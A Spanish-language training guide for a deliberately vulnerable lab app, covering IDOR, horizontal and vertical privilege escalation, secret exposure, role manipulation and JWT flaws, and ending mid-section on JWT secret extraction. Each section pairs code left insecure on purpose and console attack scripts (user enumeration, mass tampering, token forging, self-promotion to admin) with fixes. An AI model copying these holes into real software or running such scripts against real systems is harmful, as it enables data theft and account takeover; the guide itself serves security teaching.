# Gu√≠a Actualizada - Vulnerabilidades Broken Access Control (CFT)

## üìã √çndice de Vulnerabilidades

1. [IDOR - Insecure Direct Object Reference](#1-idor---insecure-direct-object-reference)
2. [Escalada de Privilegios Horizontal](#2-escalada-de-privilegios-horizontal)
3. [Escalada de Privilegios Vertical](#3-escalada-de-privilegios-vertical)
4. [Exposici√≥n de Informaci√≥n Sensible](#4-exposici√≥n-de-informaci√≥n-sensible)
5. [Manipulaci√≥n de Roles y Permisos](#5-manipulaci√≥n-de-roles-y-permisos)
6. [Vulnerabilidades en JWT](#6-vulnerabilidades-en-jwt)

---

## üèóÔ∏è Arquitectura del Sistema

### **Base de Datos Simulada (JSON)**
El sistema utiliza una base de datos simulada en memoria almacenada en `services/api.ts`:

```javascript
let usersDatabase: User[] = [
  {
    id: 1, username: 'admin', role: 'admin',
    profile: { fullName: 'Administrador de sistema', salary: 120000, ssn: '123-45-6789' }
  },
  {
    id: 2, username: 'jaranguiz', role: 'user',
    profile: { fullName: 'Juan Aranguiz Salas', salary: 65000, ssn: '987-65-4321' }
  },
  {
    id: 3, username: 'james', role: 'user',
    profile: { fullName: 'James Blond Von Gonzalez', salary: 70000, ssn: '456-78-9012' }
  },
  {
    id: 4, username: 'rob', role: 'user',
    profile: { fullName: 'Rob Spon Ja', salary: 60000, ssn: '789-01-2345' }
  }
];
```

### **Credenciales de Prueba**
- **Admin**: `admin` / `admin123`
- **Usuario 1**: `jaranguiz` / `user123`
- **Usuario 2**: `james` / `user123`  
- **Usuario 3**: `rob` / `user123`

---

## 1. IDOR - Insecure Direct Object Reference

### üìù **Descripci√≥n**

IDOR ocurre cuando la funci√≥n `getUserById()` permite acceso directo a cualquier usuario bas√°ndose en el ID proporcionado, sin validar autorizaci√≥n.

### üéØ **Ubicaci√≥n en la Aplicaci√≥n**

- **Frontend API**: `getUserById()` en `services/api.ts` (l√≠neas 105-130)
- **Frontend UI**: `/profile/:id` - Componente Profile.tsx

### üîç **C√≥digo Vulnerable**

```javascript
// services/api.ts
export const getUserById = async (id: number): Promise<User> => {
  await simulateNetworkDelay();
  
  // Simular verificaci√≥n de token (vulnerable)
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inv√°lido');
  }

  // üö® NO HAY VALIDACI√ìN: Cualquier usuario autenticado puede ver cualquier perfil
  const user = usersDatabase.find(u => u.id === id);
  
  if (!user) {
    throw createHttpError(404, 'Usuario no encontrado');
  }

  // Retornar usuario sin password pero con datos sensibles
  const userWithoutPassword = { ...user };
  delete (userWithoutPassword as any).password;
  
  return userWithoutPassword;
};
```

### üí• **Formas de Explotaci√≥n**

#### **M√©todo 1: Manipulaci√≥n de URL en el Frontend**
1. Login como `jaranguiz` (usuario ID: 2)
2. Navegar a `/profile/2` (tu perfil) ‚úÖ
3. Cambiar URL a `/profile/1` ‚ùå - Accede al perfil de admin
4. Cambiar URL a `/profile/3` ‚ùå - Accede al perfil de james
5. Cambiar URL a `/profile/4` ‚ùå - Accede al perfil de rob

#### **M√©todo 2: Manipulaci√≥n Directa en DevTools**
```javascript
// Abrir DevTools ‚Üí Console y ejecutar:

// 1. Verificar tu token actual
console.log('Mi token:', localStorage.getItem('token'));

// 2. Acceder a perfiles de otros usuarios
for (let i = 1; i <= 4; i++) {
  api.getUserById(i).then(user => {
    console.log(`Usuario ${i}:`, {
      name: user.profile?.fullName,
      salary: user.profile?.salary,
      ssn: user.profile?.ssn,
      department: user.profile?.department
    });
  }).catch(err => console.log(`Error usuario ${i}:`, err.message));
}
```

#### **M√©todo 3: Script Autom√°tico de Enumeraci√≥n**
```javascript
// Script para enumerar todos los usuarios sistem√°ticamente
const enumerateUsers = async () => {
  const discoveredUsers = [];
  
  for (let i = 1; i <= 10; i++) {
    try {
      const user = await api.getUserById(i);
      discoveredUsers.push({
        id: user.id,
        username: user.username,
        fullName: user.profile?.fullName,
        salary: user.profile?.salary,
        ssn: user.profile?.ssn,
        phone: user.profile?.phone,
        department: user.profile?.department
      });
      console.log(`‚úÖ Usuario ${i} encontrado:`, user.username);
    } catch (error) {
      console.log(`‚ùå Usuario ${i} no existe`);
    }
  }
  
  console.table(discoveredUsers);
  return discoveredUsers;
};

// Ejecutar enumeraci√≥n
enumerateUsers();
```

### üõ°Ô∏è **Contramedidas**

#### **1. Validaci√≥n de Ownership (Nivel B√°sico)**
```javascript
export const getUserById = async (id: number): Promise<User> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inv√°lido');
  }

  // ‚úÖ Validar que el usuario solo pueda acceder a su propio perfil
  if (id !== decoded.id && decoded.role !== 'admin') {
    throw createHttpError(403, 'Acceso denegado: No puedes acceder a este perfil');
  }
  
  const user = usersDatabase.find(u => u.id === id);
  
  if (!user) {
    throw createHttpError(404, 'Usuario no encontrado');
  }

  const userWithoutPassword = { ...user };
  delete (userWithoutPassword as any).password;
  
  return userWithoutPassword;
};
```

#### **2. Filtrado de Datos Sensibles**
```javascript
const filterSensitiveData = (userData: User, requestingUser: any) => {
  const baseData = {
    id: userData.id,
    username: userData.username,
    email: userData.email,
    role: userData.role,
    created_at: userData.created_at
  };
  
  // Solo mostrar datos completos al propio usuario o admin
  if (userData.id === requestingUser.id || requestingUser.role === 'admin') {
    return {
      ...baseData,
      profile: userData.profile
    };
  }
  
  // Para otros usuarios, solo informaci√≥n b√°sica
  return {
    ...baseData,
    profile: {
      fullName: userData.profile?.fullName,
      department: userData.profile?.department
      // Salary, SSN, phone no incluidos
    }
  };
};
```

---

## 2. Escalada de Privilegios Horizontal

### üìù **Descripci√≥n**

La funci√≥n `updateUser()` permite a cualquier usuario modificar el perfil de otros usuarios del mismo nivel de privilegios.

### üéØ **Ubicaci√≥n en la Aplicaci√≥n**

- **Frontend API**: `updateUser()` en `services/api.ts` (l√≠neas 132-170)
- **Frontend UI**: Formulario de edici√≥n en Profile.tsx

### üîç **C√≥digo Vulnerable**

```javascript
// services/api.ts
export const updateUser = async (id: number, userData: Partial<User['profile']>): Promise<void> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inv√°lido');
  }

  // üö® NO HAY VALIDACI√ìN: Cualquier usuario puede modificar cualquier perfil
  const userIndex = usersDatabase.findIndex(u => u.id === id);
  
  if (userIndex === -1) {
    throw createHttpError(404, 'Usuario no encontrado');
  }

  // Actualizar perfil
  usersDatabase[userIndex].profile = {
    ...usersDatabase[userIndex].profile,
    ...userData
  };

  console.log(`üö® VULNERABILITY EXPLOITED: User ${decoded.username} (ID: ${decoded.id}) modified user ${id}`);
};
```

### üí• **Formas de Explotaci√≥n**

#### **M√©todo 1: Interceptar y Modificar via DevTools**

**Usando las herramientas de desarrollador:**
1. Login como `jaranguiz` (ID: 2)
2. Ir al perfil de otro usuario via URL: `/profile/3`
3. Intentar editar el perfil (si el UI lo permite)
4. O ejecutar directamente en console:

```javascript
// Modificar perfil de James (ID: 3) desde la cuenta de jaranguiz (ID: 2)
api.updateUser(3, {
  fullName: "James HACKEADO por Juan",
  phone: "+56-555-HACKED",
  department: "Departamento Comprometido",
  salary: 1
}).then(() => {
  console.log("‚úÖ Perfil de James modificado exitosamente");
}).catch(err => {
  console.log("‚ùå Error:", err.message);
});
```

#### **M√©todo 2: Script Masivo de Modificaci√≥n**
```javascript
// Script para modificar m√∫ltiples perfiles
const maliciousUpdate = {
  fullName: "USUARIO HACKEADO",
  phone: "+56-555-PWNED",
  department: "SECURITY BREACH",
  salary: 1
};

const modifyAllUsers = async () => {
  const currentUser = api.decodeCurrentToken();
  console.log(`Atacando desde usuario: ${currentUser?.username}`);
  
  for (let targetId = 1; targetId <= 4; targetId++) {
    if (targetId === currentUser?.id) {
      console.log(`‚è≠Ô∏è Saltando usuario propio (ID: ${targetId})`);
      continue;
    }
    
    try {
      await api.updateUser(targetId, maliciousUpdate);
      console.log(`‚úÖ Usuario ${targetId} modificado exitosamente`);
    } catch (error) {
      console.log(`‚ùå Fall√≥ modificar usuario ${targetId}: ${error.message}`);
    }
  }
  
  console.log("üèÅ Ataque completado");
};

// Ejecutar ataque
modifyAllUsers();
```

#### **M√©todo 3: Modificaci√≥n Espec√≠fica de Datos Sensibles**
```javascript
// Manipular salarios espec√≠ficamente
const manipulateSalaries = async () => {
  const salaryUpdates = [
    { id: 1, salary: 50000 },  // Reducir salario del admin
    { id: 3, salary: 150000 }, // Aumentar salario de James
    { id: 4, salary: 200000 }  // Aumentar salario de Rob
  ];
  
  for (const update of salaryUpdates) {
    try {
      await api.updateUser(update.id, { salary: update.salary });
      console.log(`üí∞ Salario de usuario ${update.id} cambiado a $${update.salary}`);
    } catch (error) {
      console.log(`‚ùå Error usuario ${update.id}: ${error.message}`);
    }
  }
};
```

### üõ°Ô∏è **Contramedidas**

#### **1. Validaci√≥n de Ownership Estricta**
```javascript
export const updateUser = async (id: number, userData: Partial<User['profile']>): Promise<void> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inv√°lido');
  }

  // ‚úÖ Solo el propietario o admin puede modificar
  if (id !== decoded.id && decoded.role !== 'admin') {
    throw createHttpError(403, 'Forbidden: No puedes modificar datos de otros usuarios');
  }
  
  const userIndex = usersDatabase.findIndex(u => u.id === id);
  
  if (userIndex === -1) {
    throw createHttpError(404, 'Usuario no encontrado');
  }

  // Actualizar perfil
  usersDatabase[userIndex].profile = {
    ...usersDatabase[userIndex].profile,
    ...userData
  };

  console.log(`‚úÖ User ${decoded.username} successfully updated user ${id}`);
};
```

#### **2. Logging y Auditor√≠a**
```javascript
const securityLog: any[] = [];

const logSecurityEvent = (event: string, user: any, target: any, details: any) => {
  const logEntry = {
    timestamp: new Date().toISOString(),
    event,
    user_id: user.id,
    username: user.username,
    user_role: user.role,
    target_user_id: target,
    details,
    suspicious: user.id !== target && user.role !== 'admin'
  };
  
  securityLog.push(logEntry);
  
  if (logEntry.suspicious) {
    console.warn('üö® SECURITY ALERT: Unauthorized access attempt', logEntry);
  }
  
  return logEntry;
};

// Integrar en updateUser
export const updateUser = async (id: number, userData: Partial<User['profile']>): Promise<void> => {
  // ... validaciones previas
  
  // Log del evento
  logSecurityEvent('user_profile_update', decoded, id, userData);
  
  // ... resto del c√≥digo
};
```

---

## 3. Escalada de Privilegios Vertical

### üìù **Descripci√≥n**

La funci√≥n `getAllUsers()` permite a usuarios normales acceder a funciones administrativas sin verificar el rol de administrador.

### üéØ **Ubicaci√≥n en la Aplicaci√≥n**

- **Frontend API**: `getAllUsers()` en `services/api.ts` (l√≠neas 174-200)
- **Frontend UI**: `/admin` - Componente AdminPanel.tsx

### üîç **C√≥digo Vulnerable**

```javascript
// services/api.ts
export const getAllUsers = async (): Promise<User[]> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inv√°lido');
  }

  // üö® FALLA: No verifica si es admin
  console.log(`üö® VULNERABILITY EXPLOITED: User ${decoded.username} (role: ${decoded.role}) accessed admin user list`);

  // Retornar usuarios sin passwords pero con datos sensibles
  return usersDatabase.map(user => {
    const userWithoutPassword = { ...user };
    delete (userWithoutPassword as any).password;
    return userWithoutPassword;
  });
};
```

### üí• **Formas de Explotaci√≥n**

#### **M√©todo 1: Acceso Directo a Panel Admin**
1. Login como usuario normal (`jaranguiz`)
2. Navegar directamente a `/admin` en el frontend
3. La interfaz se carga y muestra todos los usuarios con datos sensibles

#### **M√©todo 2: Llamada Directa a la Funci√≥n**
```javascript
// Ejecutar en DevTools Console
api.getAllUsers().then(users => {
  console.log("üö® ACCESO NO AUTORIZADO A LISTA DE USUARIOS:");
  
  users.forEach(user => {
    console.log(`
üë§ Usuario: ${user.username}
üìß Email: ${user.email}
üè¢ Rol: ${user.role}
üí∞ Salario: $${user.profile?.salary?.toLocaleString()}
üÜî SSN: ${user.profile?.ssn}
üìû Tel√©fono: ${user.profile?.phone}
üè¢ Departamento: ${user.profile?.department}
    `);
  });
}).catch(err => {
  console.log("‚ùå Error:", err.message);
});
```

#### **M√©todo 3: Extracci√≥n Masiva de Datos**
```javascript
// Script para extraer y procesar todos los datos administrativos
const extractAllAdminData = async () => {
  try {
    const users = await api.getAllUsers();
    
    // Crear resumen ejecutivo
    const adminSummary = {
      total_users: users.length,
      admin_count: users.filter(u => u.role === 'admin').length,
      total_payroll: users.reduce((sum, u) => sum + (u.profile?.salary || 0), 0),
      departments: [...new Set(users.map(u => u.profile?.department))],
      sensitive_data: {
        ssns: users.map(u => ({ name: u.profile?.fullName, ssn: u.profile?.ssn })),
        phones: users.map(u => ({ name: u.profile?.fullName, phone: u.profile?.phone })),
        salaries: users.map(u => ({ name: u.profile?.fullName, salary: u.profile?.salary }))
      }
    };
    
    console.log("üìä RESUMEN ADMINISTRATIVO EXTRA√çDO:");
    console.table(adminSummary);
    
    // Guardar en variable global para acceso posterior
    (window as any).extractedData = adminSummary;
    
    return adminSummary;
  } catch (error) {
    console.log("‚ùå Error extrayendo datos:", error.message);
  }
};

// Ejecutar extracci√≥n
extractAllAdminData();
```

### üõ°Ô∏è **Contramedidas**

#### **1. Validaci√≥n de Rol de Administrador**
```javascript
export const getAllUsers = async (): Promise<User[]> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inv√°lido');
  }

  // ‚úÖ Verificar rol de administrador
  if (decoded.role !== 'admin') {
    console.warn(`üö® Unauthorized admin access attempt by user: ${decoded.username} (Role: ${decoded.role})`);
    throw createHttpError(403, 'Acceso denegado: Se requieren privilegios de administrador');
  }

  console.log(`‚úÖ Admin access granted to user: ${decoded.username}`);

  return usersDatabase.map(user => {
    const userWithoutPassword = { ...user };
    delete (userWithoutPassword as any).password;
    return userWithoutPassword;
  });
};
```

#### **2. Sistema de Permisos Granular**
```javascript
// Definir permisos espec√≠ficos
const PERMISSIONS = {
  'users.read_all': ['admin'],
  'users.read_own': ['admin', 'user'],
  'users.write_any': ['admin'],
  'users.write_own': ['admin', 'user'],
  'users.delete': ['admin'],
  'system.read': ['admin']
};

const hasPermission = (userRole: string, permission: string): boolean => {
  return PERMISSIONS[permission]?.includes(userRole) || false;
};

const requirePermission = (permission: string) => {
  return (decoded: any) => {
    if (!hasPermission(decoded.role, permission)) {
      throw createHttpError(403, `Acceso denegado: Se requiere permiso '${permission}'`);
    }
  };
};

// Uso en getAllUsers
export const getAllUsers = async (): Promise<User[]> => {
  // ... validaciones b√°sicas
  
  // ‚úÖ Verificar permiso espec√≠fico
  requirePermission('users.read_all')(decoded);
  
  // ... resto del c√≥digo
};
```

---

## 4. Exposici√≥n de Informaci√≥n Sensible

### üìù **Descripci√≥n**

La funci√≥n `getSystemInfo()` expone informaci√≥n cr√≠tica del sistema, incluyendo el JWT secret, a cualquier usuario autenticado.

### üéØ **Ubicaci√≥n en la Aplicaci√≥n**

- **Frontend API**: `getSystemInfo()` en `services/api.ts` (l√≠neas 256-285)
- **Frontend UI**: `/system` - Componente SystemInfo.tsx

### üîç **C√≥digo Vulnerable**

```javascript
// services/api.ts
const SYSTEM_CONFIG = {
  jwt_secret: 'vulnerable-secret-key', // üö® Secret expuesta
  server_info: 'Ubuntu 20.04',
  database_info: 'JSON Local Storage',
  debug_mode: true,
  last_backup: '2024-01-15',
  admin_users: ['admin'],
  total_users: usersDatabase.length
};

export const getSystemInfo = async (): Promise<SystemInfo> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inv√°lido');
  }

  // üö® CUALQUIER usuario autenticado puede acceder
  console.log(`üö® VULNERABILITY EXPLOITED: User ${decoded.username} accessed system info including JWT secret`);

  return {
    server: SYSTEM_CONFIG.server_info,
    database: SYSTEM_CONFIG.database_info,
    users_count: usersDatabase.length,
    admin_users: SYSTEM_CONFIG.admin_users,
    secret_key: SYSTEM_CONFIG.jwt_secret, // üö® MUY VULNERABLE
    last_backup: SYSTEM_CONFIG.last_backup,
    debug_mode: SYSTEM_CONFIG.debug_mode
  };
};
```

### üí• **Formas de Explotaci√≥n**

#### **M√©todo 1: Acceso Directo a System Info**
```javascript
// Ejecutar en DevTools Console como cualquier usuario autenticado
api.getSystemInfo().then(info => {
  console.log("üö® INFORMACI√ìN CR√çTICA DEL SISTEMA OBTENIDA:");
  console.log("üîë JWT Secret:", info.secret_key);
  console.log("üë• Usuarios Admin:", info.admin_users);
  console.log("üñ•Ô∏è Servidor:", info.server);
  console.log("üíæ Base de datos:", info.database);
  console.log("üêõ Modo debug:", info.debug_mode);
  console.log("üíæ √öltimo backup:", info.last_backup);
  
  // Guardar secret para uso posterior
  (window as any).stolenSecret = info.secret_key;
}).catch(err => {
  console.log("‚ùå Error:", err.message);
});
```

#### **M√©todo 2: Forjado de JWT con Secret Robada**
```javascript
// Una vez obtenida la JWT secret, crear tokens falsos
const createMaliciousToken = (userData) => {
  // Usar la secret robada del sistema
  const stolenSecret = 'vulnerable-secret-key'; // Obtenida de getSystemInfo()
  
  // Crear token de super-admin
  const maliciousPayload = {
    id: 999,
    username: 'super_hacker',
    email: 'hacker@evil.com',
    role: 'admin',
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60) // 1 a√±o
  };
  
  // Usar la funci√≥n expuesta del sistema para crear token
  const fakeToken = api.createFakeToken(maliciousPayload);
  
  console.log("üö® TOKEN FALSO CREADO:", fakeToken);
  
  // Reemplazar token actual
  localStorage.setItem('token', fakeToken);
  localStorage.setItem('user', JSON.stringify(maliciousPayload));
  
  console.log("‚úÖ Token reemplazado. Recarga la p√°gina para usar credenciales falsas.");
  
  return fakeToken;
};

// Ejecutar despu√©s de obtener system info
createMaliciousToken();
```

#### **M√©todo 3: An√°lisis Completo del Sistema**
```javascript
// Script para recopilar toda la informaci√≥n disponible
const fullSystemAnalysis = async () => {
  try {
    // 1. Obtener informaci√≥n del sistema
    const systemInfo = await api.getSystemInfo();
    
    // 2. Obtener lista completa de usuarios
    const allUsers = await api.getAllUsers();
    
    // 3. Compilar an√°lisis completo
    const analysisReport = {
      timestamp: new Date().toISOString(),
      attacker: api.decodeCurrentToken(),
      system: {
        secret_exposed: systemInfo.secret_key,
        debug_enabled: systemInfo.debug_mode,
        backup_date: systemInfo.last_backup,
        admin_list: systemInfo.admin_users
      },
      users: {
        total: allUsers.length,
        admins: allUsers.filter(u => u.role === 'admin'),
        regular_users: allUsers.filter(u => u.role === 'user'),
        total_payroll: allUsers.reduce((sum, u) => sum + (u.profile?.salary || 0), 0),
        sensitive_data: allUsers.map(u => ({
          id: u.id,
          name: u.profile?.fullName,
          ssn: u.profile?.ssn,
          salary: u.profile?.salary,
          phone: u.profile?.phone
        }))
      },
      recommendations: [
        "JWT Secret completamente comprometida",
        "Todos los datos de usuarios accesibles",
        "Sistema completamente vulnerable",
        "Posible creaci√≥n de tokens administrativos falsos"
      ]
    };
    
    console.log("üìä AN√ÅLISIS COMPLETO DEL SISTEMA:");
    console.log(analysisReport);
    
    // Guardar para referencia
    (window as any).systemAnalysis = analysisReport;
    
    return analysisReport;
    
  } catch (error) {
    console.log("‚ùå Error en an√°lisis:", error.message);
  }
};

// Ejecutar an√°lisis completo
fullSystemAnalysis();
```

### üõ°Ô∏è **Contramedidas**

#### **1. Separaci√≥n de Configuraci√≥n Sensible**
```javascript
// Configuraci√≥n p√∫blica vs sensible
const PUBLIC_SYSTEM_CONFIG = {
  app_name: 'CFT Demo App',
  version: '1.0.0',
  environment: 'development',
  features: ['user_profiles', 'admin_panel']
};

const PRIVATE_SYSTEM_CONFIG = {
  jwt_secret: process.env.JWT_SECRET || 'should-be-from-env',
  database_connection: 'sensitive-connection-string',
  api_keys: {
    third_party_service: 'secret-api-key'
  }
};

export const getSystemInfo = async (): Promise<SystemInfo> => {
  // ... validaciones
  
  // ‚úÖ Solo informaci√≥n p√∫blica disponible para usuarios normales
  if (decoded.role !== 'admin') {
    return {
      ...PUBLIC_SYSTEM_CONFIG,
      status: 'operational',
      uptime: Date.now() - startTime // Info no sensible
    };
  }
  
  // ‚úÖ Informaci√≥n adicional solo para admins (pero sin secretos)
  return {
    ...PUBLIC_SYSTEM_CONFIG,
    users_count: usersDatabase.length,
    last_backup: SYSTEM_CONFIG.last_backup,
    debug_mode: SYSTEM_CONFIG.debug_mode,
    // ‚ùå NUNCA incluir: jwt_secret, passwords, api_keys
  };
};
```

#### **2. Anonimizaci√≥n y Filtrado**
```javascript
const sanitizeSystemInfo = (info: any, userRole: string) => {
  const baseInfo = {
    status: 'operational',
    version: info.version,
    features: info.features
  };
  
  if (userRole === 'admin') {
    return {
      ...baseInfo,
      users_count: info.users_count,
      server_stats: {
        uptime: info.uptime,
        memory_usage: 'normal'
      },
      // Secrets y configuraci√≥n sensible NUNCA incluidos
    };
  }
  
  return baseInfo;
};
```

---

## 5. Manipulaci√≥n de Roles y Permisos

### üìù **Descripci√≥n**

La funci√≥n `updateUserRole()` permite a cualquier usuario cambiar los roles de otros usuarios, incluyendo auto-promoci√≥n a administrador.

### üéØ **Ubicaci√≥n en la Aplicaci√≥n**

- **Frontend API**: `updateUserRole()` en `services/api.ts` (l√≠neas 225-255)
- **Frontend UI**: Select dropdown en AdminPanel.tsx

### üîç **C√≥digo Vulnerable**

```javascript
// services/api.ts
export const updateUserRole = async (id: number, role: string): Promise<void> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inv√°lido');
  }

  const userIndex = usersDatabase.findIndex(u => u.id === id);
  
  if (userIndex === -1) {
    throw createHttpError(404, 'Usuario no encontrado');
  }

  // üö® NO HAY VALIDACI√ìN: Cualquier usuario puede cambiar roles
  const oldRole = usersDatabase[userIndex].role;
  usersDatabase[userIndex].role = role;
  
  console.log(`üö® VULNERABILITY EXPLOITED: User ${decoded.username} changed user ${id} role from ${oldRole} to ${role}`);
  
  // Si el usuario cambi√≥ su propio rol, actualizar el token en localStorage
  if (id === decoded.id) {
    const updatedUser = { ...usersDatabase[userIndex] };
    delete (updatedUser as any).password;
    const newToken = createSimpleJWT(updatedUser);
    localStorage.setItem('token', newToken);
    localStorage.setItem('user', JSON.stringify(updatedUser));
  }
};
```

### üí• **Formas de Explotaci√≥n**

#### **M√©todo 1: Auto-promoci√≥n a Admin**
```javascript
// Ejecutar como usuario normal para convertirse en admin
const promoteToAdmin = async () => {
  const currentUser = api.decodeCurrentToken();
  console.log(`Intentando promover a admin desde: ${currentUser?.username} (ID: ${currentUser?.id})`);
  
  try {
    await api.updateUserRole(currentUser.id, 'admin');
    console.log("üö® ¬°AUTO-PROMOCI√ìN EXITOSA!");
    console.log("‚úÖ Recarga la p√°gina para usar privilegios de admin");
    
    // Verificar el cambio
    const newToken = api.decodeCurrentToken();
    console.log("üîÑ Nuevo rol:", newToken?.role);
    
  } catch (error) {
    console.log("‚ùå Error en auto-promoci√≥n:", error.message);
  }
};

// Ejecutar auto-promoci√≥n
promoteToAdmin();
```

#### **M√©todo 2: Ataque Masivo de Promoci√≥n**
```javascript
// Script para convertir todos los usuarios en admins
const promoteAllUsers = async () => {
  console.log("üö® INICIANDO ATAQUE MASIVO DE PROMOCI√ìN");
  
  const results = [];
  
  for (let userId = 1; userId <= 4; userId++) {
    try {
      await api.updateUserRole(userId, 'admin');
      results.push({ userId, status: 'success', message: 'Promoted to admin' });
      console.log(`‚úÖ Usuario ${userId} promovido a admin`);
    } catch (error) {
      results.push({ userId, status: 'failed', message: error.message });
      console.log(`‚ùå Fall√≥ promover usuario ${userId}: ${error.message}`);
    }
  }
  
  console.log("üìä RESULTADOS DEL ATAQUE:");
  console.table(results);
  
  return results;
};

// Ejecutar ataque masivo
promoteAllUsers();
```

#### **M√©todo 3: Manipulaci√≥n Estrat√©gica de Roles**
```javascript
// Script m√°s sofisticado para manipular roles estrat√©gicamente
const strategicRoleManipulation = async () => {
  const currentUser = api.decodeCurrentToken();
  console.log(`üéØ Iniciando manipulaci√≥n estrat√©gica desde: ${currentUser?.username}`);
  
  const strategy = [
    { id: 1, role: 'user', reason: 'Degradar admin original' },
    { id: currentUser.id, role: 'admin', reason: 'Auto-promoci√≥n' },
    { id: 3, role: 'admin', reason: 'Crear aliado admin' },
    { id: 4, role: 'user', reason: 'Mantener como usuario normal' }
  ];
  
  console.log("üìã ESTRATEGIA DE ATAQUE:");
  console.table(strategy);
  
  for (const action of strategy) {
    try {
      await api.updateUserRole(action.id, action.role);
      console.log(`‚úÖ ${action.reason}: Usuario ${action.id} ‚Üí ${action.role}`);
      
      // Pausa entre cambios para evitar detecci√≥n
      await new Promise(resolve => setTimeout(resolve, 500));
      
    } catch (error) {
      console.log(`‚ùå Fall√≥ ${action.reason}: ${error.message}`);
    }
  }
  
  console.log("üèÅ Manipulaci√≥n estrat√©gica completada");
  console.log("üîÑ Recarga la p√°gina si cambiaste tu propio rol");
};

// Ejecutar manipulaci√≥n estrat√©gica
strategicRoleManipulation();
```

### üõ°Ô∏è **Contramedidas**

#### **1. Validaci√≥n Estricta de Permisos**
```javascript
export const updateUserRole = async (id: number, role: string): Promise<void> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inv√°lido');
  }

  // ‚úÖ Solo admins pueden cambiar roles
  if (decoded.role !== 'admin') {
    throw createHttpError(403, 'Acceso denegado: Se requieren privilegios de administrador');
  }

  // ‚úÖ Validar rol v√°lido
  const validRoles = ['user', 'admin'];
  if (!validRoles.includes(role)) {
    throw createHttpError(400, 'Rol inv√°lido');
  }

  const userIndex = usersDatabase.findIndex(u => u.id === id);
  
  if (userIndex === -1) {
    throw createHttpError(404, 'Usuario no encontrado');
  }

  // ‚úÖ Prevenir degradaci√≥n del √∫ltimo admin
  if (usersDatabase[userIndex].role === 'admin' && role !== 'admin') {
    const adminCount = usersDatabase.filter(u => u.role === 'admin').length;
    if (adminCount <= 1) {
      throw createHttpError(400, 'No puedes degradar el √∫ltimo administrador');
    }
  }

  const oldRole = usersDatabase[userIndex].role;
  usersDatabase[userIndex].role = role;
  
  console.log(`‚úÖ Admin ${decoded.username} changed user ${id} role from ${oldRole} to ${role}`);
  
  // Log del cambio cr√≠tico
  if (role === 'admin') {
    console.warn(`üö® CRITICAL: New admin created by ${decoded.username}`);
  }
};
```

#### **2. Sistema de Auditor√≠a para Cambios de Roles**
```javascript
const roleChangeAudit: any[] = [];

const auditRoleChange = (admin: any, targetId: number, oldRole: string, newRole: string) => {
  const auditEntry = {
    timestamp: new Date().toISOString(),
    action: 'role_change',
    admin_user: {
      id: admin.id,
      username: admin.username
    },
    target_user: targetId,
    role_change: {
      from: oldRole,
      to: newRole
    },
    severity: newRole === 'admin' ? 'HIGH' : 'MEDIUM',
    requires_review: newRole === 'admin'
  };
  
  roleChangeAudit.push(auditEntry);
  
  // Alertas para cambios cr√≠ticos
  if (newRole === 'admin') {
    console.warn('üö® CRITICAL ROLE CHANGE AUDIT:', auditEntry);
  }
  
  return auditEntry;
};

// Funci√≥n para revisar auditor√≠a
export const getRoleChangeAudit = () => {
  return roleChangeAudit.filter(entry => entry.requires_review);
};
```

---

## 6. Vulnerabilidades en JWT

### üìù **Descripci√≥n**

El sistema de JWT presenta m√∫ltiples vulnerabilidades: secret key expuesta, almacenamiento inseguro en localStorage, y falta de invalidaci√≥n de tokens.

### üéØ **Ubicaci√≥n en la Aplicaci√≥n**

- **Frontend API**: JWT functions en `services/api.ts` (l√≠neas 35-75)
- **Configuraci√≥n**: `SYSTEM_CONFIG` con secret expuesta (l√≠nea 20)

### üîç **C√≥digo Vulnerable**

```javascript
// services/api.ts
const SYSTEM_CONFIG = {
  jwt_secret: 'vulnerable-secret-key', // üö® Secret hardcodeada y d√©bil
  // ... otros configs
};

// üö® Funci√≥n que crea JWT con secret expuesta
const createSimpleJWT = (user: Omit<User, 'password'>) => {
  const header = btoa(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
  const payload = btoa(JSON.stringify({
    id: user.id,
    username: user.username,
    email: user.email,
    role: user.role,
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + (24 * 60 * 60) // 24 horas
  }));
  const signature = btoa(`signature_with_${SYSTEM_CONFIG.jwt_secret}`);
  
  return `${header}.${payload}.${signature}`;
};

// Login que almacena en localStorage (vulnerable)
export const loginUser = async (username: string, password: string): Promise<LoginResponse> => {
  // ... validaci√≥n
  const token = createSimpleJWT(userWithoutPassword);
  
  // üö® Almacena en localStorage (vulnerable a XSS)
  return {
    token,
    user: userWithoutPassword
  };
};
```

### üí• **Formas de Explotaci√≥n**

#### **M√©todo 1: Extracci√≥n de JWT Secret**
